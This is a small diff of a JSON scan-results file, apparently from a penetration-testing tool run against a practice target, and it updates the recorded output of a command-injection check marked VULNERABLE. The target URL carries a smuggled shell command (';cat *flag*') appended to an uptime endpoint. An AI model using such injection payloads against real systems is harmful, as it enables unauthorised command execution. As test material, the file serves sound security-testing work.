@@ -7,6 +7,6 @@
   {
     "target": "https://pentest-ground.com:9000/uptime/;cat%20%2Aflag%2A",
     "status": "VULNERABLE",
-    "output": "\"{\\n  \\\"response\\\": {\\n    \\\"command\\\": \\\"uptime -;cat *flag*\\\",\\n    \\\"output\\\": \\\" 19:16:26 up 9 days,  6:26,  0 users,  load average: 0.85, 0.57, 0.51\\\\n\\\"\\n  }\\n}\"\n"
+    "output": "\"{\\n  \\\"response\\\": {\\n    \\\"command\\\": \\\"uptime -;cat *flag*\\\",\\n    \\\"output\\\": \\\" 21:11:43 up 9 days,  8:21,  0 users,  load average: 0.44, 0.77, 0.73\\\\n\\\"\\n  }\\n}\"\n"
   }
 ]
